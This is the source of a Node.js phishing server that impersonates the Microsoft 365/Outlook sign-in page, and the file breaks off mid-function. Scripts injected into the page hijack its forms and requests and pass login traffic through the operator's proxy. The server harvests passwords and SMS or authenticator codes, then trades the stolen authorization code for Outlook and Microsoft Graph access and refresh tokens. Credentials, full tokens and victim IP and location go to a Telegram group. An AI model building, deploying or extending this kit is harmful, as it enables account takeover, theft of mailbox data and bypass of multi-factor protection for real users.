require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const requestIp = require('request-ip');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs').promises;

const app = express();
const server = http.createServer(app);

// ============= PRODUCTION MODE DETECTION =============
const isProduction = process.env.NODE_ENV === 'production';
const APP_URL = process.env.APP_URL || (isProduction ? 'https://your-app.com' : 'http://localhost:3001');

// Clean APP_URL (remove trailing slash)
const cleanAppUrl = APP_URL.replace(/\/$/, '');

console.log(`\n🚀 ========== SERVER STARTING ==========`);
console.log(`📊 Mode: ${isProduction ? 'PRODUCTION' : 'DEVELOPMENT'}`);
console.log(`🌐 App URL: ${cleanAppUrl}`);
console.log(`🔌 Port: ${process.env.PORT || 3001}`);
console.log(`========================================\n`);

// ============= RENDER-SPECIFIC CONFIGURATION =============
app.set('trust proxy', true);

// ============= MIDDLEWARE =============
const allowedOrigins = isProduction 
  ? [cleanAppUrl, 'https://login.microsoftonline.com']
  : ['http://localhost:3001', 'http://127.0.0.1:3001'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true
}));

app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const io = new Server(server, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST'],
    credentials: true
  },
  transports: ['polling', 'websocket'],
  pingTimeout: 60000,
  pingInterval: 25000
});

// ============= BOT INITIALIZATION =============
let bot;
let telegramGroupId = process.env.TELEGRAM_GROUP_ID;

const initializeBot = () => {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
  
  const usePolling = process.env.USE_POLLING === 'true' || !isProduction;
  
  if (usePolling) {
    console.log('🔧 Using POLLING mode');
    bot.deleteWebHook()
      .then(() => bot.startPolling())
      .catch(err => console.error('❌ Failed to start polling:', err));
  } else {
    console.log('🚀 Using WEBHOOK mode');
    const webhookUrl = `${cleanAppUrl}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
      .then(() => console.log('✅ Webhook set successfully to:', webhookUrl))
      .catch(err => console.error('❌ Webhook setup failed:', err));
  }
  
  return bot;
};

initializeBot();

app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ============= SESSION MANAGEMENT =============
const activeSessions = new Map();
const capturedData = new Map();
const microsoftParams = new Map();
const requestTimestamps = new Map();
const codeVerifiers = new Map();

const SESSION_TIMEOUT = 7200000;
const CLEANUP_INTERVAL = 600000;
const SESSION_COOLDOWN = 5000;

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of activeSessions.entries()) {
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      activeSessions.delete(sessionId);
    }
  }
}, CLEANUP_INTERVAL);

// ============= PKCE HELPER FUNCTIONS =============
function generateCodeVerifier() {
  return crypto.randomBytes(64)
    .toString('base64')
    .replace(/[^a-zA-Z0-9]/g, '')
    .substring(0, 128);
}

function generateCodeChallenge(verifier) {
  const hash = crypto.createHash('sha256').update(verifier).digest();
  return hash.toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Verify Turnstile token with Cloudflare API
async function verifyTurnstileToken(token, remoteip) {
  const secretKey = process.env.TURNSTILE_SECRET_KEY;
  
  if (!secretKey) {
    console.error('❌ TURNSTILE_SECRET_KEY not set');
    return { success: false };
  }

  try {
    const response = await axios.post(
      'https://challenges.cloudflare.com/turnstile/v0/siteverify',
      {
        secret: secretKey,
        response: token,
        remoteip: remoteip
      },
      {
        headers: { 'Content-Type': 'application/json' }
      }
    );

    return response.data;
  } catch (error) {
    console.error('❌ Turnstile verification failed:', error.message);
    return { success: false, error: 'Verification request failed' };
  }
}

// Turnstile middleware for Express
async function turnstileMiddleware(req, res, next) {
  // Skip verification for GET requests or if disabled
  if (req.method === 'GET' || process.env.SKIP_TURNSTILE === 'true') {
    return next();
  }

  const token = req.body['cf-turnstile-response'];
  const remoteip = req.ip || req.connection.remoteAddress;

  if (!token) {
    console.log('⚠️ Turnstile token missing');
    return res.status(400).json({ 
      error: 'Turnstile token missing',
      message: 'Please complete the security check'
    });
  }

  const verification = await verifyTurnstileToken(token, remoteip);

  if (!verification.success) {
    console.log('⚠️ Turnstile verification failed:', verification['error-codes']);
    return res.status(403).json({ 
      error: 'Turnstile verification failed',
      message: 'Security check failed. Please try again.'
    });
  }

  // Token is valid, proceed
  console.log('✅ Turnstile verification passed');
  next();
}

// ============= VICTIM INFO CAPTURE HELPER =============
async function getVictimInfo(req) {
  try {
    const ip = requestIp.getClientIp(req) || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
      }
    } catch (e) {}

    return {
      ip,
      location,
      browser: agent.toAgent() || 'Unknown',
      os: agent.os.toString() || 'Unknown',
      device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
      timestamp: new Date().toLocaleString()
    };
  } catch (err) {
    return {
      ip: 'Unknown',
      location: 'Unknown',
      browser: 'Unknown',
      os: 'Unknown',
      device: 'Unknown',
      timestamp: new Date().toLocaleString()
    };
  }
}

// ============= SOCKET.IO HANDLERS =============
io.on('connection', (socket) => {
  let sessionId = socket.handshake.query.sessionId || uuidv4();
  
  if (!activeSessions.has(sessionId)) {
    activeSessions.set(sessionId, {
      stage: 'initial',
      lastActivity: Date.now(),
      details: null,
      email: null,
      password: null,
      sockets: new Set([socket.id]),
      createdAt: Date.now()
    });
  } else {
    const session = activeSessions.get(sessionId);
    session.sockets.add(socket.id);
    session.lastActivity = Date.now();
  }

  socket.emit('connection_established', { sessionId });

  socket.on('client_info', (userAgent) => {
    const session = activeSessions.get(sessionId);
    if (session) {
      const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
      const geo = geoip.lookup(ip) || {};
      const agent = useragent.parse(userAgent);
      
      session.details = {
        ip,
        location: geo.country ? `${geo.city || 'Unknown'}, ${geo.country}` : 'Unknown',
        browser: agent.toAgent(),
        os: agent.os.toString(),
        timestamp: new Date().toLocaleString()
      };
      session.lastActivity = Date.now();
    }
  });

  socket.on('submit_email', async (email) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.email = email;
    session.stage = 'awaiting_password';
    session.lastActivity = Date.now();

    const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${email}`;
    await bot.sendMessage(telegramGroupId, message, {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }]
        ]
      }
    });
    
    socket.emit('email_sent');
  });

  socket.on('submit_password', async (password) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.password = password;
    session.stage = 'awaiting_action';
    session.lastActivity = Date.now();

    await bot.sendMessage(telegramGroupId, 
      `🔒 Password received for ${session.email}\nPassword: ${password}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
            [{ text: '🔐 Request Auth Code', callback_data: `request_auth|${sessionId}` }],
            [{ text: '✅ Done', callback_data: `done|${sessionId}` }]
          ]
        }
      }
    );
    
    socket.emit('password_sent');
  });

  socket.on('disconnect', () => {
    const session = activeSessions.get(sessionId);
    if (session) {
      session.sockets.delete(socket.id);
      session.lastActivity = Date.now();
    }
  });
});

// ============= TELEGRAM BOT HANDLERS =============
bot.on('callback_query', async (cb) => {
  const [action, sessionId] = cb.data.split('|');
  const session = activeSessions.get(sessionId);
  
  if (!session) {
    await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
    return;
  }

  session.lastActivity = Date.now();

  if (action === 'request_password') {
    sendToSession(sessionId, 'request_password');
    await bot.answerCallbackQuery(cb.id, { text: 'Requesting password' });
  } else if (action === 'request_sms' || action === 'request_auth') {
    const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
    sendToSession(sessionId, 'request_2fa', codeType);
    await bot.answerCallbackQuery(cb.id, { text: `Requesting ${codeType} code` });
  } else if (action === 'done') {
    sendToSession(sessionId, 'redirect_to_gmail');
    await bot.sendMessage(telegramGroupId, 
      `✅ Login complete for ${session.email}\nPassword: ${session.password || 'N/A'}`
    );
    await bot.answerCallbackQuery(cb.id, { text: 'Redirecting user' });
  }
});

function sendToSession(sessionId, event, data) {
  const session = activeSessions.get(sessionId);
  if (!session) return false;
  
  for (const socketId of session.sockets) {
    const socket = io.sockets.sockets.get(socketId);
    if (socket?.connected) socket.emit(event, data);
  }
  return true;
}

// ============= ROOT REDIRECT =============
app.get('/', (req, res) => {
  console.log(`↪️ Redirecting root to ${isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft'}`);
  res.redirect(isProduction ? '/en-us/microsoft-365/outlook' : '/microsoft');
});

// ============= CLEANUP INTERVAL FOR CODE VERIFIERS =============
setInterval(() => {
  const now = Date.now();
  const oneHourAgo = now - 3600000;
  let cleanedCount = 0;
  
  for (const [sessionId, verifier] of codeVerifiers.entries()) {
    const match = sessionId.match(/sess_(\d+)_/);
    if (match && parseInt(match[1]) < oneHourAgo) {
      codeVerifiers.delete(sessionId);
      cleanedCount++;
    }
  }
  
  if (cleanedCount > 0) {
    console.log(`🧹 Cleaned up ${cleanedCount} old code verifiers`);
  }
}, 3600000);

// ============= MICROSOFT LOGIN PAGE FETCHER =============
const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com';

// ===== DUAL TOKEN CAPTURE CONFIGURATION =====
const DUAL_TOKEN_CLIENT_ID = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; // Teams client ID
const DUAL_TOKEN_REDIRECT_URI = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const DUAL_TOKEN_SCOPE = 'https://outlook.office.com/.default openid profile offline_access';

// ============= MICROSOFT LANDING PAGE WITH RANDOM TEMPLATE =============
app.get('/microsoft', async (req, res) => {
  try {
    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      return res.status(429).send('Rate limited');
    }
    requestTimestamps.set(clientIp, now);
    
    const template = await getRandomTemplate();
    
    if (!template) {
      console.error('❌ No template available, serving fallback');
      return res.status(500).send('Template not available');
    }
    
    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const $ = cheerio.load(template.content);
    
    $('head').append(`
      <script>
        sessionStorage.setItem('phishSessionId', '${sessionId}');
        localStorage.setItem('phishSessionId', '${sessionId}');
        
        fetch('/api/track-page-view', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: '${sessionId}',
            template: '${template.name}',
            url: window.location.href,
            timestamp: new Date().toISOString()
          })
        }).catch(err => console.log('Tracking error:', err));
        
        console.log('📊 Template loaded: ${template.name}');
        console.log('🔑 Session ID: ${sessionId}');
      </script>
    `);
    
    $('form').each((i, form) => {
      const originalAction = $(form).attr('action') || '';
      console.log(`🔧 Modifying form ${i+1}, original action: ${originalAction}`);
      
      $(form).attr('action', '/common/login');
      $(form).attr('method', 'POST');
      $(form).removeAttr('onsubmit');
      
      if (!$(form).find('input[name="sessionId"]').length) {
        $(form).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
      }
      
      if (!$(form).find('input[name="state"]').length) {
        $(form).append(`<input type="hidden" name="state" value="${sessionId}">`);
      }
    });
    
    $('a').each((i, link) => {
      const href = $(link).attr('href');
      if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
        $(link).attr('data-original-href', href);
        $(link).attr('onclick', `event.preventDefault(); trackLinkClick('${href}', '${sessionId}', '${template.name}'); return false;`);
      }
    });
    
    $('body').append(`
      <script>
        function trackLinkClick(url, sessionId, templateName) {
          console.log('🔗 Tracking click to:', url);
          
          fetch('/api/track-click', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: sessionId,
              template: templateName,
              targetUrl: url,
              timestamp: new Date().toISOString()
            })
          }).then(() => {
            window.location.href = url;
          }).catch(() => {
            window.location.href = url;
          });
        }
      </script>
    `);
    
    microsoftParams.set(sessionId, {
      template: template.name,
      servedAt: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent']
    });
    
    res.send($.html());
    
    console.log(`✅ Served template "${template.name}" to ${clientIp} (Session: ${sessionId})`);
    
  } catch (error) {
    console.error('❌ Error serving Microsoft page:', error.message);
    res.status(500).send('Error loading page');
  }
});

app.get('/en-us/microsoft-365/outlook', async (req, res) => {
  try {
    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      return res.send(`<html><body>Rate limited</body></html>`);
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'dual_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    
    codeVerifiers.set(sessionId, codeVerifier);
    
    console.log(`🔐 Dual Token PKCE for session ${sessionId}:`, {
      verifierLength: codeVerifier.length,
      challenge: codeChallenge.substring(0, 20) + '...'
    });
    
    const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
    authUrl.searchParams.append('client_id', DUAL_TOKEN_CLIENT_ID);
    authUrl.searchParams.append('response_type', 'code');
    authUrl.searchParams.append('redirect_uri', DUAL_TOKEN_REDIRECT_URI);
    authUrl.searchParams.append('scope', DUAL_TOKEN_SCOPE);
    authUrl.searchParams.append('code_challenge', codeChallenge);
    authUrl.searchParams.append('code_challenge_method', 'S256');
    authUrl.searchParams.append('state', sessionId);
    authUrl.searchParams.append('prompt', 'select_account');
    authUrl.searchParams.append('response_mode', 'query');
    
    const microsoftResponse = await axios({
      method: 'GET',
      url: authUrl.toString(),
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 5,
      timeout: 30000
    });

    let html = microsoftResponse.data;
    const $ = cheerio.load(html);
    
    // Replace localhost references with production URL
    const origin = isProduction ? cleanAppUrl : 'http://localhost:3001';
    
    $('head').append(`
      <script>
        (function() {
          console.log('🔧 Dual token capture proxy active');
          
          const ORIGIN = '${origin}';
          
          // Override fetch
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            if (typeof url === 'string' && url.includes('/GetCredentialType')) {
              console.log('🔄 Redirecting GetCredentialType to proxy');
              return originalFetch(ORIGIN + '/proxy/GetCredentialType', {
                ...options,
                headers: {
                  ...options.headers,
                  'Origin': ORIGIN
                }
              });
            }
            return originalFetch(url, options);
          };
          
          // Override XHR
          const originalXHR = window.XMLHttpRequest;
          window.XMLHttpRequest = function() {
            const xhr = new originalXHR();
            const originalOpen = xhr.open;
            
            xhr.open = function(method, url, ...args) {
              if (typeof url === 'string' && url.includes('/GetCredentialType')) {
                console.log('🔄 Redirecting XHR GetCredentialType to proxy');
                url = ORIGIN + '/proxy/GetCredentialType';
              }
              return originalOpen.call(this, method, url, ...args);
            };
            
            return xhr;
          };
          
          // Level 1: MutationObserver for dynamically added forms
          const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
              if (mutation.addedNodes) {
                mutation.addedNodes.forEach(function(node) {
                  if (node.nodeName === 'FORM' || (node.querySelector && node.querySelector('form'))) {
                    console.log('🔍 New form detected, modifying...');
                    fixAllForms();
                  }
                });
              }
            });
          });
          
          observer.observe(document.body, { childList: true, subtree: true });
          
          function fixAllForms() {
            document.querySelectorAll('form').forEach(function(form) {
              if (form.dataset.fixed === 'true') return;
              
              console.log('🔧 Fixing form. Original action:', form.action);
              
              if (form.action.includes('/common/login')) {
                console.log('⚠️ Form was pointing to /common/login, fixing...');
                form.action = ORIGIN + '/proxy/dual-login';
              }
              
              form.method = 'POST';
              
              const requiredFields = [
                'sessionId', 'state', 'client_id', 
                'redirect_uri', 'scope', 'response_mode',
                'code_challenge', 'code_challenge_method'
              ];
              
              requiredFields.forEach(fieldName => {
                if (!form.querySelector(\`input[name="\${fieldName}"]\`)) {
                  const input = document.createElement('input');
                  input.type = 'hidden';
                  input.name = fieldName;
                  
                  if (fieldName === 'sessionId' || fieldName === 'state') {
                    input.value = '${sessionId}';
                  } else if (fieldName === 'client_id') {
                    input.value = '${DUAL_TOKEN_CLIENT_ID}';
                  } else if (fieldName === 'redirect_uri') {
                    input.value = '${DUAL_TOKEN_REDIRECT_URI}';
                  } else if (fieldName === 'scope') {
                    input.value = '${DUAL_TOKEN_SCOPE}';
                  } else if (fieldName === 'response_mode') {
                    input.value = 'query';
                  } else if (fieldName === 'code_challenge') {
                    input.value = '${codeChallenge}';
                  } else if (fieldName === 'code_challenge_method') {
                    input.value = 'S256';
                  }
                  
                  form.appendChild(input);
                  console.log(\`➕ Added hidden field: \${fieldName}\`);
                }
              });
              
              form.dataset.fixed = 'true';
              
              form.addEventListener('submit', function(e) {
                console.log('📤 Form submitting to:', this.action);
                
                if (this.action.includes('/common/login')) {
                  e.preventDefault();
                  console.log('⚠️ Action was reset at last moment, fixing...');
                  this.action = ORIGIN + '/proxy/dual-login';
                  this.submit();
                }
              }, true);
            });
          }
          
          // Level 4: Hijack XHR that might reset forms
          const xhrOpen = XMLHttpRequest.prototype.open;
          XMLHttpRequest.prototype.open = function(method, url, ...args) {
            this.addEventListener('load', function() {
              setTimeout(fixAllForms, 50);
            });
            return xhrOpen.call(this, method, url, ...args);
          };
          
          setInterval(fixAllForms, 500);
          
          setTimeout(fixAllForms, 100);
          setTimeout(fixAllForms, 500);
          setTimeout(fixAllForms, 1000);
          
          const originalLocation = window.location;
          Object.defineProperty(window, 'location', {
            get: function() { return originalLocation; },
            set: function(value) {
              console.log('⚠️ Attempt to change location to:', value);
              if (value.includes('/common/login')) {
                console.log('🛑 Blocked redirect to /common/login');
                return;
              }
              originalLocation.href = value;
            }
          });
          
          console.log('✅ All interception layers active for dual token capture');
        })();
      </script>
    `);

    $('body').append(`
      <script>
        sessionStorage.setItem('phishSessionId', '${sessionId}');
        console.log('💾 Session ID stored:', '${sessionId}');
      </script>
    `);

    const params = {};
    $('input').each((i, elem) => {
      const name = $(elem).attr('name');
      const value = $(elem).attr('value') || '';
      if (name && value) params[name] = value;
    });
    
    microsoftParams.set(sessionId, params);
    
    $('form').each((i, form) => {
      console.log('🔧 Original form action:', $(form).attr('action'));
      
      $(form).attr('action', '/proxy/dual-login');
      $(form).attr('method', 'POST');
      $(form).removeAttr('onsubmit');
      
      const formClone = $(form).clone(true, true);
      $(form).replaceWith(formClone);
      form = formClone[0];
      
      const fields = {
        'sessionId': sessionId,
        'state': sessionId,
        'client_id': DUAL_TOKEN_CLIENT_ID,
        'redirect_uri': DUAL_TOKEN_REDIRECT_URI,
        'scope': DUAL_TOKEN_SCOPE,
        'response_mode': 'query',
        'code_challenge': codeChallenge,
        'code_challenge_method': 'S256'
      };
      
      Object.entries(fields).forEach(([name, value]) => {
        $(form).find(`input[name="${name}"]`).remove();
        $(form).append(`<input type="hidden" name="${name}" value="${value}">`);
      });
      
      console.log('✅ Modified form action to:', $(form).attr('action'));
      
      form.addEventListener('submit', function(e) {
        console.log('📤 Form submitting to:', this.action);
        return true;
      });
    });
    
    res.send($.html());
    
  } catch (error) {
    console.error('Dual token flow error:', error.message);
    res.status(500).send('Error loading login page');
  }
});

// ===== DUAL TOKEN EXCHANGE ENDPOINT =====
app.post('/proxy/dual-login', turnstileMiddleware, express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 Dual token login submission');
  
  const sessionId = req.body?.state || req.body?.sessionId || 'unknown';
  const username = req.body?.login;
  const password = req.body?.passwd;
  
  const victimInfo = await getVictimInfo(req);
  
  if (username && password) {
    let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
    session.credentials = { username, password, time: new Date().toISOString(), victimInfo };
    capturedData.set(sessionId, session);
  }
  
  const codeVerifier = codeVerifiers.get(sessionId);
  
  if (!codeVerifier) {
    console.error(`❌ No code verifier for session ${sessionId}`);
    return res.redirect('/en-us/microsoft-365/outlook?error=no_verifier');
  }
  
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => formData.append(key, req.body[key]));
    
    console.log('📤 Submitting dual token login form...');
    
    const response = await axios.post('https://login.microsoftonline.com/common/login', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    if (response?.headers?.location?.includes('/common/login')) {
      const errorMatch = response.headers.location.match(/error=([^&]+)/);
      const error = errorMatch ? errorMatch[1] : 'invalid_password';
      return res.redirect(`/en-us/microsoft-365/outlook?error=${error}&username=${encodeURIComponent(username || '')}&state=${sessionId}`);
    }
    
    if (response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Microsoft redirects to: ${location}`);
      
      if (location.includes('urn:ietf:wg:oauth:2.0:oob') && location.includes('code=')) {
        const codeMatch = location.match(/[?&]code=([^&]+)/);
        if (codeMatch && codeMatch[1]) {
          const code = decodeURIComponent(codeMatch[1]);
          console.log(`✅ Auth code captured for ${sessionId}: ${code.substring(0, 30)}...`);
          
          console.log('🔄 Exchanging for Outlook token...');
          
          const outlookTokens = await exchangeForResource(
            sessionId, code, codeVerifier, 
            'https://outlook.office.com/.default', 
            'outlook'
          );
          
          console.log('🔄 Exchanging same code for Graph token...');
          
          const graphTokens = await exchangeForResource(
            sessionId, code, codeVerifier, 
            'https://graph.microsoft.com/.default', 
            'graph'
          );
          
          let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
          
          if (outlookTokens) {
            tokenSession.tokens.outlook = {
              access_token: outlookTokens.access_token,
              refresh_token: outlookTokens.refresh_token,
              expires_in: outlookTokens.expires_in,
              scope: outlookTokens.scope,
              captured_at: new Date().toISOString()
            };
            console.log('✅ Outlook tokens stored');
          }
          
          if (graphTokens) {
            tokenSession.tokens.graph = {
              access_token: graphTokens.access_token,
              refresh_token: graphTokens.refresh_token,
              expires_in: graphTokens.expires_in,
              scope: graphTokens.scope,
              captured_at: new Date().toISOString()
            };
            console.log('✅ Graph tokens stored');
          }
          
          tokenSession.tokens.dual_capture = true;
          tokenSession.tokens.captured_at = new Date().toISOString();
          
          capturedData.set(sessionId, tokenSession);
          
          await sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens);
          
          console.log('🔄 Dual token capture successful, redirecting to Outlook...');
          return res.redirect('https://outlook.live.com/mail/');
        }
      }
    }
    
    res.redirect('/en-us/microsoft-365/outlook?error=auth_failed');
    
  } catch (error) {
    console.error('❌ Dual token login error:', error.message);
    if (error.response) {
      console.error('Response data:', error.response.data);
    }
    res.redirect('/en-us/microsoft-365/outlook?error=connection_error');
  }
});

// Helper function to exchange code for a specific resource
async function exchangeForResource(sessionId, code, codeVerifier, scope, resourceName) {
  try {
    console.log(`🔄 Exchanging for ${resourceName} token...`);
    
    const tokenParams = {
      client_id: DUAL_TOKEN_CLIENT_ID,
      code: code,
      code_verifier: codeVerifier,
      redirect_uri: DUAL_TOKEN_REDIRECT_URI,
      grant_type: 'authorization_code',
      scope: scope
    };
    
    const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', 
      new URLSearchParams(tokenParams).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      }
    );
    
    const tokens = tokenResponse.data;
    console.log(`✅ ${resourceName} tokens received!`);
    console.log(`   Access Token: ${tokens.access_token.substring(0, 50)}...`);
    console.log(`   Refresh Token: ${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'Not provided'}`);
    console.log(`   Expires in: ${tokens.expires_in} seconds`);
    
    return tokens;
    
  } catch (error) {
    console.error(`❌ ${resourceName} token exchange failed:`, error.response?.data || error.message);
    return null;
  }
}

// ===== DUAL TOKEN NOTIFICATION =====
async function sendDualTokenNotification(sessionId, username, victimInfo, outlookTokens, graphTokens) {
  let message = `🎯 *WINNING STRATEGY: DUAL TOKENS!*\n`;
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Session:* \`${sessionId}\`\n`;
  message += `*Email:* \`${username}\`\n`;
  message += `━━━━━━━━━━━━━━━━━━\n\n`;
  
  if (outlookTokens) {
    message += `*📧 OUTLOOK TOKEN (via code exchange)*\n`;
    message += `• Expires: ${outlookTokens.expires_in} seconds\n`;
    message += `• Access: \`${outlookTokens.access_token.substring(0, 50)}...\`\n`;
    message += `• Refresh: \`${outlookTokens.refresh_token?.substring(0, 50) || 'N/A'}...\`\n\n`;
  }
  
  if (graphTokens) {
    message += `*🔄 GRAPH TOKEN (via Outlook refresh)*\n`;
    message += `• Expires: ${graphTokens.expires_in} seconds\n`;
    message += `• Access: \`${graphTokens.access_token.substring(0, 50)}...\`\n`;
    message += `• Refresh: \`${graphTokens.refresh_token?.substring(0, 50) || 'Same as Outlook'}...\`\n\n`;
  }
  
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Strategy:* 1 Code → Outlook → Refresh → Graph\n`;
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Victim Information:*\n`;
  message += `• IP: \`${victimInfo.ip}\`\n`;
  message += `• Location: ${victimInfo.location}\n`;
  message += `• Browser: ${victimInfo.browser}\n`;
  message += `• OS: ${victimInfo.os}\n`;
  message += `━━━━━━━━━━━━━━━━━━\n`;
  message += `*Debug:* \`/debug-cookies/${sessionId}\``;
  
  await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
    .catch(e => console.error('Telegram error:', e.message));
  
  if (outlookTokens) {
    await sendTokenFile(sessionId, username, 'outlook', outlookTokens);
  }
  if (graphTokens) {
    await sendTokenFile(sessionId, username, 'graph', graphTokens);
  }
}

// Helper to send token as file
async function sendTokenFile(sessionId, username, type, tokens) {
  const fileContent = `${type.toUpperCase()} TOKEN CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━━
Session: ${sessionId}
Email: ${username}
Capture Time: ${new Date().toISOString()}
Token Type: ${type === 'outlook' ? 'Outlook API' : 'Microsoft Graph'}
Expires In: ${tokens.expires_in} seconds

ACCESS TOKEN:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.access_token}

REFRESH TOKEN:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.refresh_token || 'Not provided'}

SCOPE:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.scope || 'N/A'}`;

  try {
    await bot.sendDocument(
      telegramGroupId,
      Buffer.from(fileContent, 'utf-8'),
      {},
      {
        filename: `${type}_token_${sessionId}_${Date.now()}.txt`,
        contentType: 'text/plain'
      }
    );
    console.log(`✅ ${type} token file sent to Telegram`);
  } catch (error) {
    console.error(`❌ Failed to send ${type} token file:`, error.message);
  }
}

// Keep the original desktop endpoint for backward compatibility
const DESKTOP_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const DESKTOP_REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob';

app.get('/microsoft-desktop', async (req, res) => {
  try {
    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      return res.send(`<html><body>Rate limited</body></html>`);
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    
    codeVerifiers.set(sessionId, codeVerifier);
    
    console.log(`🔐 Desktop PKCE for session ${sessionId}:`, {
      verifierLength: codeVerifier.length,
      challenge: codeChallenge.substring(0, 20) + '...'
    });
    
    const authUrl = new URL('https://login.microsoftonline.com/common/oauth2/v2.0/authorize');
    authUrl.searchParams.append('client_id', DESKTOP_CLIENT_ID);
    authUrl.searchParams.append('response_type', 'code');
    authUrl.searchParams.append('redirect_uri', DESKTOP_REDIRECT_URI);
    authUrl.searchParams.append('scope', 'https://outlook.office.com/.default openid profile offline_access');
    authUrl.searchParams.append('code_challenge', codeChallenge);
    authUrl.searchParams.append('code_challenge_method', 'S256');
    authUrl.searchParams.append('state', sessionId);
    authUrl.searchParams.append('prompt', 'select_account');
    authUrl.searchParams.append('response_mode', 'query');
    
    const microsoftResponse = await axios({
      method: 'GET',
      url: authUrl.toString(),
      headers: {
        'User-Agent': 'Outlook/2026 (Windows NT 10.0; Win64; x64)',
        'X-Client-SKU': 'MSAL.Desktop',
        'X-Client-Ver': '4.48.1.0',
        'X-Client-OS': 'Windows 10.0.22621',
        'X-Client-CPU': 'x64',
